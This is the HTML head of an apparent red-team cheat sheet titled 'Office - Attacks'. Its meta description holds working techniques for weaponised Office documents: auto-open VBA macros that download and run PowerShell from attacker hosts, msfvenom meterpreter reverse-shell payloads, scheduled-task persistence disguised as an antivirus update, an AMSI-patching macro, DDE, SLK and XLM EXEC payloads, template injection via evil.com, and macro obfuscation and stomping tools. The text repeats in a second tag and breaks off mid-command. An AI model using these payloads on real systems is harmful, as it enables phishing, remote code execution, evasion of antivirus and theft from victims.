<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Office - Attacks" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Summary XLSM - Hot Manchego XLS - Macrome XLM Excel 4.0 - SharpShooter XLM Excel 4.0 - EXCELntDonut XLM Excel 4.0 - EXEC DOCM - Metasploit DOCM - Download and Execute DOCM - Macro Creator DOCM - C# converted to Office VBA macro DOCM - VBA Wscript DOCM - VBA Shell Execute Comment DOCM - VBA Spawning via svchost.exe using Scheduled Task DCOM - WMI COM functions (VBA AMSI) DOCM - winmgmts DOCM - Macro Pack - Macro and DDE DOCM - CACTUSTORCH VBA Module DOCM - MMG with Custom DL + Exec VBA Obfuscation VBA Purging OfficePurge EvilClippy VBA AMSI VBA - Offensive Security Template DOCX - Template Injection DOCX - DDE References XLSM - Hot Manchego When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn’t catch a simple lolbas payload to get a beacon on a target machine. https://github.com/FortyNorthSecurity/hot-manchego Generate CS Macro and save it to Windows as vba.txt PS&gt; New-Item blank.xlsm PS&gt; C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs PS&gt; .\hot-manchego.exe .\blank.xlsm .\vba.txt XLM - Macrome XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros. https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip # NOTE: The payload cannot contains NULL bytes. # Default calc msfvenom -a x86 -b &#39;\x00&#39; --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread &gt; popcalc.bin msfvenom -a x64 -b &#39;\x00&#39; --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread &gt; popcalc64.bin # Custom shellcode msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b &#39;\x00&#39; msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b &#39;\x00&#39; # MSF shellcode msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b &#39;\x00&#39; -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b &#39;\x00&#39; -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin # For VBA Macro Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop When using Macrome build mode, the –password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of VelvetSweatshop is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003. XLM Excel 4.0 - SharpShooter https://github.com/mdsecactivebreach/SharpShooter 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Options -rawscfile &lt;path&gt; Path to raw shellcode file for stageless payloads --scfile &lt;path&gt; Path to shellcode file as CSharp byte array python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test # Creation of a VBA Macro # creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet. SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl # Creation of an Excel 4.0 SLK Macro Enabled Document ~# /!\ The shellcode cannot contain null bytes msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b &#39;\x00&#39; SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b &#39;\x00&#39; SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee XLM Excel 4.0 - EXCELntDonut XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files. AMSI has no visibility into XLM macros (for now) Anti-virus struggles with XLM (for now) XLM macros can access the Win32 API (virtualalloc, createthread, …) Open an Excel Workbook. Right click on “Sheet 1” and click “Insert…”. Select “MS Excel 4.0 Macro”. Open your EXCELntDonut output file in a text editor and copy everything. Paste the EXCELntDonut output text in Column A of your XLM Macro sheet. At this point, everything is in column A. To fix that, we’ll use the “Text-to-Columns”/”Convert” tool under the “Data” tab. Highlight column A and open the “Text-to-Columns” tool. Select “Delimited” and then “Semicolon” on the next screen. Select “Finished”. Right-click on cell A1* and select “Run”. This will execute your payload to make sure it works. To enable auto-execution, we need to rename cell A1* to “Auto_Open”. You can do this by clicking into cell A1 and then clicking into the box that says “A1”* just above Column A. Change the text from “A1”* to “Auto_Open”. Save the file and verify that auto-execution works. :warning: If you’re using the obfuscate flag, after the Text-to-columns operation, your macros won’t start in A1. Instead, they’ll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let’s say that cell is HJ1. If that’s the case, then complete steps 6-7 substituting HJ1 for A1 git clone https://github.com/FortyNorthSecurity/EXCELntDonut -f path to file containing your C# source code (exe or dll) -c ClassName where method that you want to call lives (dll) -m Method containing your executable payload (dll) -r References needed to compile your C# code (ex: -r &#39;System.Management&#39;) -o output filename --sandbox Perform basic sandbox checks. --obfuscate Perform basic macro obfuscation. # Fork git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\Users\User\Desktop\covenSource.cs C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\Users\User\Desktop\covenSource.cs donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate] python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md XLM Excel 4.0 - EXEC Right Click to the current sheet Insert a Macro IntL MS Excel 4.0 Add the EXEC macro 1 2 =EXEC(&quot;poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg(&#39;http://10.10.10.10:80/update.ps1&#39;)&quot;) =halt() Rename cell to Auto_open Hide your macro worksheet by a right mouse click on the sheet name Macro1 and selecting Hide DOCM - Metasploit use exploit/multi/fileformat/office_word_macro set payload windows/meterpreter/reverse_http set LHOST 10.10.10.10 set LPORT 80 set DisablePayloadHandler True set PrependMigrate True set FILENAME Financial2021.docm exploit -j DOCM - Download and Execute Detected by Defender (AMSI) Sub Execute() Dim payload payload = &quot;powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring(&#39;http://10.10.10.10:4242/exploit&#39;);&quot; Call Shell(payload, vbHide) End Sub Sub Document_Open() Execute End Sub DOCM - Macro Creator https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator # Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion: C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body # Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion: C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o # Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion: C:\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url &#39;http://my.server.com/sources.xml&#39; -d biblio -c &#39;regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll&#39; -o -e DOCM - C# converted to Office VBA macro A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted. https://github.com/trustedsec/unicorn python unicorn.py payload.cs cs macro DOCM - VBA Wscript https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office Sub parent_change() Dim objOL Set objOL = CreateObject(&quot;Outlook.Application&quot;) Set shellObj = objOL.CreateObject(&quot;Wscript.Shell&quot;) shellObj.Run(&quot;notepad.exe&quot;) End Sub Sub AutoOpen() parent_change End Sub Sub Auto_Open() parent_change End Sub 1 2 CreateObject(&quot;WScript.Shell&quot;).Run &quot;calc.exe&quot; CreateObject(&quot;WScript.Shell&quot;).Exec &quot;notepad.exe&quot; DOCM - VBA Shell Execute Comment Set your command payload inside the Comment metadata of the document. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Sub beautifulcomment() Dim p As DocumentProperty For Each p In ActiveDocument.BuiltInDocumentProperties If p.Name = &quot;Comments&quot; Then Shell (p.Value) End If Next End Sub Sub AutoExec() beautifulcomment End Sub Sub AutoOpen() beautifulcomment End Sub DOCM - VBA Spawning via svchost.exe using Scheduled Task Sub AutoOpen() Set service = CreateObject(&quot;Schedule.Service&quot;) Call service.Connect Dim td: Set td = service.NewTask(0) td.RegistrationInfo.Author = &quot;Kaspersky Corporation&quot; td.settings.StartWhenAvailable = True td.settings.Hidden = False Dim triggers: Set triggers = td.triggers Dim trigger: Set trigger = triggers.Create(1) Dim startTime: ts = DateAdd(&quot;s&quot;, 30, Now) startTime = Year(ts) &amp; &quot;-&quot; &amp; Right(Month(ts), 2) &amp; &quot;-&quot; &amp; Right(Day(ts), 2) &amp; &quot;T&quot; &amp; Right(Hour(ts), 2) &amp; &quot;:&quot; &amp; Right(Minute(ts), 2) &amp; &quot;:&quot; &amp; Right(Second(ts), 2) trigger.StartBoundary = startTime trigger.ID = &quot;TimeTriggerId&quot; Dim Action: Set Action = td.Actions.Create(0) Action.Path = &quot;C:\Windows\System32\powershell.exe&quot; Action.Arguments = &quot;-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&quot; Call service.GetFolder(&quot;\&quot;).RegisterTaskDefinition(&quot;AVUpdateTask&quot;, td, 6, , , 3) End Sub Rem powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&quot; DOCM - WMI COM functions Basic WMI exec (detected by Defender) : r = GetObject(&quot;winmgmts:\\.\root\cimv2:Win32_Process&quot;).Create(&quot;calc.exe&quot;, null, null, intProcessID) Sub wmi_exec() strComputer = &quot;.&quot; Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;) Set objStartUp = objWMIService.Get(&quot;Win32_ProcessStartup&quot;) Set objProc = objWMIService.Get(&quot;Win32_Process&quot;) Set procStartConfig = objStartUp.SpawnInstance_ procStartConfig.ShowWindow = 1 objProc.Create &quot;powershell.exe&quot;, Null, procStartConfig, intProcessID End Sub https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3 https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2 Sub ASR_bypass_create_child_process_rule5() Const HIDDEN_WINDOW = 0 strComputer = &quot;.&quot; Set objWMIService = GetObject(&quot;win&quot; &amp; &quot;mgmts&quot; &amp; &quot;:\\&quot; &amp; strComputer &amp; &quot;\root&quot; &amp; &quot;\cimv2&quot;) Set objStartup = objWMIService.Get(&quot;Win32_&quot; &amp; &quot;Process&quot; &amp; &quot;Startup&quot;) Set objConfig = objStartup.SpawnInstance_ objConfig.ShowWindow = HIDDEN_WINDOW Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root&quot; &amp; &quot;\cimv2&quot; &amp; &quot;:Win32_&quot; &amp; &quot;Process&quot;) objProcess.Create &quot;cmd.exe /c powershell.exe IEX ( IWR -uri &#39;http://10.10.10.10/stage.ps1&#39;)&quot;, Null, objConfig, intProcessID End Sub Sub AutoExec() ASR_bypass_create_child_process_rule5 End Sub Sub AutoOpen() ASR_bypass_create_child_process_rule5 End Sub Const ShellWindows = &quot;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&quot; Set SW = GetObject(&quot;new:&quot; &amp; ShellWindows).Item() SW.Document.Application.ShellExecute &quot;cmd.exe&quot;, &quot;/c powershell.exe&quot;, &quot;C:\Windows\System32&quot;, Null, 0 DOCM/XLM - Macro Pack - Macro and DDE Only the community version is available online. git clone https://github.com/sevagas/macro_pack https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # Options -G, --generate=OUTPUT_FILE_PATH. Generates a file. -t, --template=TEMPLATE_NAME Use code template already included in MacroPack -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name) # Execute a command echo &quot;calc.exe&quot; | macro_pack.exe -t CMD -G cmd.xsl # Download and execute a file echo &lt;file_to_drop_url&gt; &quot;&lt;download_path&gt;&quot; | macro_pack.exe -t DROPPER -o -G dropper.xls # Meterpreter reverse TCP template using MacroMeter by Cn33liz echo &lt;ip&gt; &lt;port&gt; | macro_pack.exe -t METERPRETER -o -G meter.docm # Drop and execute embedded file macro_pack.exe -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs # Obfuscate the vba file generated by msfvenom and put result in a new vba file. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba # Obfuscate Empire stager vba file and generate a MS Word document: macro_pack.exe -f empire.vba -o -G myDoc.docm # Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe) echo &quot;https://myurl.url/payload.exe&quot; &quot;dropped.exe&quot; | macro_pack.exe -o -t DROPPER -G &quot;drop.xlsm&quot; # Execute calc.exe via Dynamic Data Exchange (DDE) attack echo calc.exe | macro_pack.exe --dde -G calc.xslx # Download and execute file via powershell using Dynamic Data Exchange (DDE) attack macro_pack.exe --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.xsl # PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --keep-alive -G out.docm # PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses. msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --trojan -G hotpics.pptm # PRO: Generate an HTA payload able to run a shellcode via Excel injection echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE --run-in-excel -o -G samples\nicepic.hta echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\my_shortcut.lnk # PRO: XLM Injection echo &quot;MPPro&quot; | macro_pack.exe -G _samples\hello.doc -t HELLO --xlm --run-in-excel # PRO: ShellCode Exec - Heap Injection, AlternativeInjection echo &quot;x32calc.bin&quot; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc echo &quot;x32calc.bin&quot; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc # PRO: More shellcodes echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive echo &quot;x86.bin&quot; &quot;x64.bin&quot; | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc echo &quot;http://192.168.5.10:8080/x32calc.bin&quot; &quot;http://192.168.5.10:8080/x64calc.bin&quot; | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls DOCM - CACTUSTORCH VBA Module CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript https://github.com/mdsecactivebreach/CACTUSTORCH https://github.com/tyranid/DotNetToJScript/ CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ Import .cna in Cobalt Strike Generate a new VBA payload from the CACTUSTORCH menu Download DotNetToJscript Compile it DotNetToJscript.exe - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript ExampleAssembly.dll - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text “test” Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch Use the generated code to replace the hardcoded binary in CactusTorch DOCM - MMG with Custom DL + Exec Custom Download in first Macro to “C:\Users\Public\beacon.exe” Create a custom binary execute using MMG Merge both Macro git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator python MMG.py configs/generic-cmd.json malicious.vba { &quot;description&quot;: &quot;Generic command exec payload\nEvasion technique set to none&quot;, &quot;template&quot;: &quot;templates/payloads/generic-cmd-template.vba&quot;, &quot;varcount&quot;: 152, &quot;encodingoffset&quot;: 5, &quot;chunksize&quot;: 180, &quot;encodedvars&quot;: {}, &quot;vars&quot;: [], &quot;evasion&quot;: [&quot;encoder&quot;], &quot;payload&quot;: &quot;cmd.exe /c C:\\Users\\Public\\beacon.exe&quot; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Private Declare PtrSafe Function URLDownloadToFile Lib &quot;urlmon&quot; Alias &quot;URLDownloadToFileA&quot; (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean On Error GoTo Failed DownloadFileA = False &#39;As directory must exist, this is a check If CreateObject(&quot;Scripting.FileSystemObject&quot;).FolderExists(CreateObject(&quot;Scripting.FileSystemObject&quot;).GetParentFolderName(DownloadPath)) = False Then Exit Function Dim returnValue As Long returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0) &#39;If return value is 0 and the file exist, then it is considered as downloaded correctly DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) &gt; 0) Exit Function Failed: End Function Sub AutoOpen() DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\Users\\Public\\beacon.exe&quot; End Sub Sub Auto_Open() DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\Users\\Public\\beacon.exe&quot; End Sub DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro Go to Developer tab on ribbon -&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control 1 2 3 Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle) Run = Shell(&quot;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(&#39;https://&lt;host&gt;/file.exe&#39;,&#39;file.exe&#39;);Start-Process &#39;file.exe&#39;&quot;, vbNormalFocus) End Sub VBA Obfuscation # https://www.youtube.com/watch?v=L0DlPOLx2k0 $ git clone https://github.com/bonnetn/vba-obfuscator $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin VBA Purging VBA Stomping: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. :warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format. OfficePurge https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe 1 2 3 4 OfficePurge.exe -d word -f .\malicious.doc -m NewMacros OfficePurge.exe -d excel -f .\payroll.xls -m Module1 OfficePurge.exe -d publisher -f .\donuts.pub -m ThisDocument OfficePurge.exe -d word -f .\malicious.doc -l EvilClippy Evil Clippy uses the OpenMCDF library to manipulate CFBF files. Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows. If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this. # OSX/Linux mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs # Windows csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc # make macro code unaccessible is to mark the project as locked and unviewable: -u # Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag. EvilClippy.exe -r macrofile.doc VBA - Offensive Security Template Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process RunPE - https://github.com/itm4n/VBA-RunPE Spoof Parent - https://github.com/py7hagoras/OfficeMacro64 AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3 VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba VBA - AMSI The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/ :warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy). The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr Private Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtr Private Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long Private Declare PtrSafe Sub CopyMemory Lib &quot;kernel32&quot; Alias &quot;RtlMoveMemory&quot; (Destination As Any, Source As Any, ByVal Length As LongPtr) Private Sub Document_Open() Dim AmsiDLL As LongPtr Dim AmsiScanBufferAddr As LongPtr Dim result As Long Dim MyByteArray(6) As Byte Dim ArrayPointer As LongPtr MyByteArray(0) = 184 &#39; 0xB8 MyByteArray(1) = 87 &#39; 0x57 MyByteArray(2) = 0 &#39; 0x00 MyByteArray(3) = 7 &#39; 0x07 MyByteArray(4) = 128 &#39; 0x80 MyByteArray(5) = 195 &#39; 0xC3 AmsiDLL = LoadLibrary(&quot;amsi.dll&quot;) AmsiScanBufferAddr = GetProcAddress(AmsiDLL, &quot;AmsiScanBuffer&quot;) result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0) ArrayPointer = VarPtr(MyByteArray(0)) CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6 End Sub DOCX - Template Injection :warning: Does not require “Enable Macro” Remote Template A malicious macro is saved in a Word template .dotm file Benign .docx file is created based on one of the default MS Word Document templates Document from step 2 is saved as .docx Document from step 3 is renamed to .zip Document from step 4 gets unzipped .\word_rels\settings.xml.rels contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb). 1 2 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; &lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt; 1 2 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;https://evil.com/malicious.dotm&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt; File gets zipped back up again and renamed to .docx Template Injections Tools https://github.com/JohnWoodman/remoteInjector https://github.com/ryhanson/phishery $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx [+] Opening Word document: good.docx [+] Setting Word document template to: https://secure.site.local/docs [+] Saving injected Word document to: bad.docx [*] Injected Word document has been saved! DOCX - DDE Insert &gt; QuickPart &gt; Field Right Click &gt; Toggle Field Code { DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot; } SLK - Excel ID;P O;E NN;NAuto_open;ER101C1;KOut Flank;F C;X1;Y101;K0;EEXEC(&quot;c:\shell.cmd&quot;) C;X1;Y102;K0;EHALT() E References VBA RunPE Part 1 - itm4n VBA RunPE Part 2 - itm4n Office VBA AMSI Parting the veil on malicious macros - Microsoft Bypassing AMSI fro VBA - Outflank Evil Clippy MS Office Maldoc Assistant - Outflank Old schoold evil execl 4.0 macros XLM - Outflank Excel 4 Macro Generator x86/x64 - bytecod3r VBad - Pepitoh Excel 4.0 Macro Function Reference PDF Excel 4.0 Macros so hot right now - SneekyMonkey Macros and more with sharpshooter v2.0 - mdsec Further evasion in the forgotten corners of ms xls - malware.pizza Excel 4.0 macro old but new - fsx30 XLS 4.0 macros and covenant - d-sec Inject macro from a remote dotm template - ired.team Phishinh with OLE - ired.team Phishing SLK - ired.teambypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships) PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018 AMSI in the heap - rmdavy WordAMSIBypass - rmdavy Dechaining macros and evading EDR - Noora Hyvärinen Executing macros from docx with remote - RedXORBlueJuly 18, 2018 One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021 Running macros via ActiveX controls - greyhathacker - September 29, 2016 Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental" />
<meta property="og:description" content="Summary XLSM - Hot Manchego XLS - Macrome XLM Excel 4.0 - SharpShooter XLM Excel 4.0 - EXCELntDonut XLM Excel 4.0 - EXEC DOCM - Metasploit DOCM - Download and Execute DOCM - Macro Creator DOCM - C# converted to Office VBA macro DOCM - VBA Wscript DOCM - VBA Shell Execute Comment DOCM - VBA Spawning via svchost.exe using Scheduled Task DCOM - WMI COM functions (VBA AMSI) DOCM - winmgmts DOCM - Macro Pack - Macro and DDE DOCM - CACTUSTORCH VBA Module DOCM - MMG with Custom DL + Exec VBA Obfuscation VBA Purging OfficePurge EvilClippy VBA AMSI VBA - Offensive Security Template DOCX - Template Injection DOCX - DDE References XLSM - Hot Manchego When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn’t catch a simple lolbas payload to get a beacon on a target machine. https://github.com/FortyNorthSecurity/hot-manchego Generate CS Macro and save it to Windows as vba.txt PS&gt; New-Item blank.xlsm PS&gt; C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs PS&gt; .\hot-manchego.exe .\blank.xlsm .\vba.txt XLM - Macrome XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros. https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip # NOTE: The payload cannot contains NULL bytes. # Default calc msfvenom -a x86 -b &#39;\x00&#39; --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread &gt; popcalc.bin msfvenom -a x64 -b &#39;\x00&#39; --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw 